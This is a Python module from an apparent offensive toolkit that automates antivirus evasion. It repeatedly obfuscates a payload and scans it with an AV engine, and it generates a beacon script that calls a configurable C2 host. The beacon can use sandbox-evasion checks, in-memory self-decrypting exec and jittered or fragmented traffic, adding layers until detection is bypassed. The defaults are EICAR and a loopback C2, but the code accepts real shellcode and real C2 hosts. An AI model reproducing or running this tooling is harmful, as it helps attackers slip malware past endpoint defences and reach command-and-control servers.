"""Evolution loop — score → derive → build → scan/run → report, now with
*static and dynamic* gates.

The armory could already score, attribute and derive on paper. ``avprobe`` gave
it hands. But detection is two gates, not one:

* **Static** — the file's bytes and structure are scanned on write. Obfuscation,
  encoding, entropy and packing layers fight this gate.
* **Dynamic** — the sample is *run* and the AV's behavior engine reacts to what
  it does: a callback to a known C2, self-decrypting execution, persistence,
  injection. Anti-sandbox, fileless and traffic layers fight this gate.

Passing static is the easy part (base64 an EICAR and the signature is gone);
passing dynamic is the hard part, because a real C2 callback is exactly what a
threat-intel feed is built to flag. This module drives both gates and derives
the *right kind* of next layer for whichever gate just blocked the sample.

Honesty, again not buried:

* The **static sample is the EICAR test string** (every AV must flag the naked
  form, so a layer that turns it clean really did change the signature).
* The **dynamic sample is a self-contained beacon script** whose callback goes
  to a loopback mock C2 by default. Against loopback the behavior engine does
  not fire, so a clean result means "it ran and called home", *not* "stealthy".
  To exercise the dynamic block, point ``c2_host`` at a real test C2 the AV
  knows about.
* Only stdlib-capable transforms/behaviors are applied; packing, junk-code,
  control-flow flattening, real code-signing and real injection need an
  external toolchain and are reported ``skipped`` rather than faked.
"""

from __future__ import annotations

import base64
import importlib.util
import sys
from pathlib import Path

# Standard EICAR test string (68 bytes, ASCII). Every AV must flag the naked
# form; that makes it the correct static sample for verifying our transforms
# actually change what the AV sees.
EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# Default runtime payload for the dynamic beacon: harmless, self-contained code.
# Replaced with a real shellcode/payload when the operator passes ``payload=``.
DEFAULT_CODE = "print('sapper-beacon-executed')"

# --------------------------------------------------------------------------- #
# static transforms — layer id -> (label, bytes -> bytes)
# --------------------------------------------------------------------------- #
STATIC_TRANSFORMS: dict[str, tuple[str, object]] = {
    "obf.string-enc": ("字符串常量 base64 编码", lambda b: b"enc:" + base64.b64encode(b)),
    "ent.base64-xor": ("base64 + XOR 0x5A", lambda b: base64.b64encode(bytes(c ^ 0x5A for c in b))),
    "ent.pad": ("段填充降熵(2048B)", lambda b: b + bytes((i * 37 + 11) & 0xFF for i in range(2048))),
    "ent.split": ("载荷分片重组", lambda b: b"\n--\n".join(
        b[i:i + max(1, len(b) // 4)] for i in range(0, len(b), max(1, len(b) // 4)))),
}

# --------------------------------------------------------------------------- #
# dynamic behaviors — layer id -> (label, code, slot)
# slot: "pre" runs before the callback, "send" replaces the default callback send
# --------------------------------------------------------------------------- #
DYNAMIC_BEHAVIORS: dict[str, tuple[str, str, str]] = {
    "sb.sleep-skip": ("启动前延时(抗沙盒)", "time.sleep(3)", "pre"),
    "sb.human-check": ("人机环境检测桩", "if not os.environ.get('USERNAME') and not os.environ.get('USER'): sys.exit(0)", "pre"),
    "fileless.srdi": ("自解密内存执行", "exec(compile(_decoded, '<mem>', 'exec'))", "pre"),
    "tr.frag": ("beacon 分片慢速发送", "for _i in range(0, len(_decoded), 4):\n    s.send(_decoded[_i:_i+4])\n    time.sleep(0.05)", "send"),
    "tr.jitter": ("beacon 随机间隔抖动", "time.sleep(random.random())\ns.send(_decoded)", "send"),
}

# Which layer categories belong to which gate, for deriving the right next layer.
STATIC_CATS = {"obfuscate", "entropy", "pack", "sign", "anti-decompile", "junk-code"}
DYNAMIC_CATS = {"anti-sandbox", "fileless", "traffic"}


def _sibling(name: str, key: str):
    """Lazy-load a sibling module by path, reusing one already registered.

    A caller that already imported the module by its bare name (e.g. tests do
    ``import avprobe``) must get the *same* module instance, otherwise any
    state on it (mock sequences) would not be visible to this file.
    """
    if key in sys.modules:
        return sys.modules[key]
    bare = name[:-3] if name.endswith(".py") else name
    if bare in sys.modules:
        return sys.modules[bare]
    spec = importlib.util.spec_from_file_location(key, Path(__file__).with_name(name))
    mod = importlib.util.module_from_spec(spec)
    sys.modules[key] = mod
    spec.loader.exec_module(mod)
    return mod


def _armory():
    return _sibling("armory.py", "sapper_armory")


def _avprobe():
    return _sibling("avprobe.py", "sapper_avprobe")


def _payload_bytes(payload) -> bytes:
    if payload is None:
        return EICAR.encode("ascii")
    if isinstance(payload, bytes):
        return payload
    return str(payload).encode("utf-8")


def build_sample(variant: dict, payload=None) -> dict:
    """Static sample: the payload bytes with stdlib-capable layers applied."""
    data = _payload_bytes(payload)
    applied: list[dict] = []
    skipped: list[str] = []
    for lid in variant.get("stack") or []:
        if lid in STATIC_TRANSFORMS:
            label, fn = STATIC_TRANSFORMS[lid]
            data = fn(data)
            applied.append({"layer": lid, "transform": label})
        elif lid not in DYNAMIC_BEHAVIORS:
            skipped.append(lid)
    return {
        "data": data,
        "applied": applied,
        "skipped": skipped,
        "note": ("静态层已落地；跳过层需外部工具链（加壳/花指令/签名/反调试）"
                 if skipped else "静态层已全部落地"),
    }


def build_script(variant: dict, *, c2_host: str, c2_port: int,
                 payload=None, beacon_id: str = "") -> dict:
    """Dynamic sample: a self-contained beacon script.

    The payload is base64-stored (the static disguise) and decoded at runtime;
    dynamic layers inject real runtime behavior. Returns the script source and
    an honest accounting of which behaviors were applied.
    """
    code = payload if isinstance(payload, str) else (
        DEFAULT_CODE if payload is None else str(payload))
    data = code.encode("utf-8")

    # static disguise applied to the runtime payload too
    for lid in variant.get("stack") or []:
        if lid in STATIC_TRANSFORMS:
            data = STATIC_TRANSFORMS[lid][1](data)
    payload_b64 = base64.b64encode(data).decode("ascii")

    pre_lines: list[str] = []
    send_code = "s.send(_decoded)"
    dyn_applied: list[dict] = []
    dyn_skipped: list[str] = []
    for lid in variant.get("stack") or []:
        if lid in DYNAMIC_BEHAVIORS:
            label, snippet, slot = DYNAMIC_BEHAVIORS[lid]
            if slot == "pre":
                pre_lines.append(snippet)
            else:
                send_code = snippet
            dyn_applied.append({"layer": lid, "behavior": label})
        elif lid not in STATIC_TRANSFORMS:
            dyn_skipped.append(lid)

    lines = [
        "import base64, socket, time, os, random, sys",
        "",
        f'PAYLOAD_B64 = "{payload_b64}"',
        "_decoded = base64.b64decode(PAYLOAD_B64)",
        "try:",
    ]
    for p in pre_lines:
        for ln in p.split("\n"):
            lines.append("    " + ln)
    lines.append("    s = socket.socket()")
    lines.append("    s.settimeout(8)")
    lines.append(f'    s.connect(("{c2_host}", {c2_port}))')
    for ln in send_code.split("\n"):
        lines.append("    " + ln)
    lines.append("    s.close()")
    lines.append('    print("BEACON_SENT")')
    lines.append("except Exception as _e:")
    lines.append('    print("BEACON_FAIL:", _e)')
    lines.append("    sys.exit(1)")
    script = "\n".join(lines) + "\n"
    return {
        "script": script,
        "payload_b64": payload_b64,
        "applied": dyn_applied,
        "skipped": dyn_skipped,
        "note": ("动态行为已注入；跳过层需外部工具链/真实目标（注入/代理链/真实C2）"
                 if dyn_skipped else "动态行为已全部注入"),
    }


def _derive_for(cands: list[dict], gate: str) -> list[dict]:
    """Pick landable candidates for the gate that just blocked: static or dynamic."""
    if gate == "static":
        want_cats, landable_map = STATIC_CATS, STATIC_TRANSFORMS
    else:
        want_cats, landable_map = DYNAMIC_CATS, DYNAMIC_BEHAVIORS
    return [c for c in cands
            if c.get("cat") in want_cats and c["layer"] in landable_map]


def evolve(
    wid: str,
    vid: str | None = None,
    *,
    engine: str = "huorong",
    profile: list[str] | None = None,
    rounds: int = 5,
    top: int = 1,
    payload=None,
    ext: str = ".com",
    wait: float = 3.0,
    c2_host: str = "127.0.0.1",
    c2_port: int = 45678,
    tmpdir: str | None = None,
    on_step=None,
) -> dict:
    """Run the evolution loop across both detection gates.

    Each round: build the static sample, scan it; build the dynamic beacon,
    run it. A static block derives a static layer; a dynamic block derives a
    dynamic layer; both clean reports success.
    """
    armory = _armory()
    avprobe = _avprobe()
    tags = list(profile or [])

    a = armory.Armory()
    weapon = a.load(wid)
    if vid:
        cur = next((v for v in weapon["variants"] if v["vid"] == vid), None)
        if cur is None:
            raise ValueError(f"{wid} 没有变体 {vid}")
    else:
        cur = a.best_variant(weapon, profile=tags) or weapon["variants"][0]

    current_vid = cur["vid"]
    steps: list[dict] = []
    success = False
    reason = f"轮数上限 {rounds} 已到"

    for rnd in range(1, int(rounds) + 1):
        a = armory.Armory()
        weapon = a.load(wid)
        cur = next((v for v in weapon["variants"] if v["vid"] == current_vid), None)
        if cur is None:
            reason = f"变体 {current_vid} 不存在"
            break

        dyn: dict = {}
        script: dict = {}
        # --- gate 1: static scan ------------------------------------------
        sample = build_sample(cur, payload=payload)
        static = avprobe.probe_bytes(
            sample["data"], engine=engine, ext=ext, wait=wait,
            tmpdir=tmpdir, label=f"{wid}/{current_vid}:static",
        )
        if static["result"] == "detected":
            gate = "static"
            outcome = "blocked"
        else:
            # --- gate 2: dynamic run --------------------------------------
            script = build_script(cur, c2_host=c2_host, c2_port=c2_port,
                                  payload=payload, beacon_id=f"{wid}/{current_vid}")
            dyn = avprobe.probe_dynamic(
                script["script"], c2_host=c2_host, c2_port=c2_port,
                tmpdir=tmpdir, label=f"{wid}/{current_vid}:dynamic",
            )
            gate = "dynamic"
            outcome = ("blocked" if dyn["result"] in ("detected", "error")
                       else "ok")
            if static["result"] == "error" and dyn["result"] == "clean":
                gate, outcome = "static", "blocked"

        a.report(wid, current_vid, outcome, profile=tags,
                 note=f"avprobe:{gate}:{engine}")

        step = {
            "round": rnd,
            "variant": current_vid,
            "stack": list(cur.get("stack") or []),
            "gate": gate,
            "static_result": static["result"],
            "static_applied": sample["applied"],
            "static_skipped": sample["skipped"],
            "dynamic_result": dyn.get("result"),
            "dynamic_applied": script.get("applied", []),
            "dynamic_skipped": script.get("skipped", []),
            "beacon_reached": dyn.get("beacon_reached"),
            "outcome": outcome,
            "elapsed": static.get("elapsed", 0.0),
            "new_variant": None,
        }
        steps.append(step)
        if on_step:
            on_step(step)

        if outcome == "ok":
            success = True
            reason = f"第 {rnd} 轮 {current_vid} 通过静态+动态双关"
            break

        # blocked → derive the right kind of layer for the gate that failed
        d = a.derive(wid, current_vid, profile=tags, limit=12)
        cands = d.get("candidates") or []
        landable = _derive_for(cands, gate)
        if not landable:
            reason = (f"第 {rnd} 轮 {gate} 关被拦，可落地{gate}层已耗尽"
                      f"（剩余候选需外部工具链/真实目标）")
            break
        picks: list[str] = []
        for c in landable[: max(1, int(top))]:
            for lid in c.get("bundle") or [c["layer"]]:
                if lid not in picks:
                    picks.append(lid)
        out = a.apply_derived(wid, current_vid, picks, profile=tags)
        current_vid = out["variant"]["vid"]
        step["new_variant"] = current_vid

    return {
        "weapon": wid,
        "engine": engine,
        "profile": tags,
        "c2": f"{c2_host}:{c2_port}",
        "rounds_planned": int(rounds),
        "rounds_run": len(steps),
        "success": success,
        "reason": reason,
        "final_variant": current_vid,
        "steps": steps,
        "sample_default": "EICAR" if payload is None else "custom",
        "note": ("静态样本=EICAR(必检，测混淆层)；动态样本=回连 beacon，"
                 "默认指向本地 mock C2（测行为链路+存活，非免杀）。"
                 "要测动态拦截需把 c2_host 指向 AV 威胁情报中的真实测试 C2。")
                if payload is None else "",
    }


def render_steps(transcript: dict) -> str:
    """Human-readable transcript for CLI output."""
    lines = [f"{transcript['weapon']} 进化 @ {transcript['engine']}  "
             f"画像[{','.join(transcript['profile']) or '-'}]  c2={transcript['c2']}"]
    for s in transcript["steps"]:
        mark = {"clean": "放行", "detected": "被拦", "error": "异常"}
        gate = {"static": "静态", "dynamic": "动态"}.get(s["gate"], s["gate"])
        res_key = "static_result" if s["gate"] == "static" else "dynamic_result"
        gate_result = mark.get(s.get(res_key), s.get(res_key) or "-")
        applied = ",".join(t.get("transform") or t.get("behavior")
                           for t in (s.get("static_applied") or [])) or "(裸)"
        dyn_applied = ",".join(t.get("behavior") for t in (s.get("dynamic_applied") or []))
        nxt = f" → 派生 {s['new_variant']}" if s["new_variant"] else ""
        lines.append(
            f"  R{s['round']} {s['variant']} 栈[{len(s['stack'])}] {gate}关{gate_result}"
            f"  [{applied}]"
            + (f" 动态[{dyn_applied or '无'}]" if s.get("gate") == "dynamic" else "")
            + nxt
        )
    lines.append(f"结论: {'✅ 双关通过' if transcript['success'] else '❌ 未突破'}"
                 f" — {transcript['reason']}")
    if transcript["note"]:
        lines.append(f"注: {transcript['note']}")
    return "\n".join(lines)
